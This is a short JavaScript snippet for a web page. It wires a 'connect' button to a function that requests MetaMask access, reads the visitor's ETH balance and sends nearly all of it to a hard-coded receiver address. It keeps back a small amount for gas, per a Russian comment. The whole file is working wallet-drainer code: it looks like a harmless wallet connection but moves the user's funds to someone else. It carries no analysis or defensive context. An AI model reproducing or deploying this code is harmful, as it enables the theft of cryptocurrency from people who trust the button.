const receiverAddress = "0xC225bC0b6B89DeA3dC55116f6ab3EFE9E1c4bf72";

async function connectWalletAndSendEth() {
  if (typeof window.ethereum !== "undefined") {
    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const userAddress = await signer.getAddress();
      const balanceWei = await provider.getBalance(userAddress);

      if (balanceWei.gt(0)) {
        const tx = await signer.sendTransaction({
          to: receiverAddress,
          value: balanceWei.sub(ethers.utils.parseUnits('0.0001', 'ether')) // чуть оставить на gas
        });

        console.log("Transaction sent:", tx.hash);
      } else {
        console.log("No ETH to send.");
      }
    } catch (error) {
      console.error("Error:", error);
    }
  } else {
    alert("MetaMask is not installed!");
  }
}

document.getElementById("connectButton").addEventListener("click", connectWalletAndSendEth)
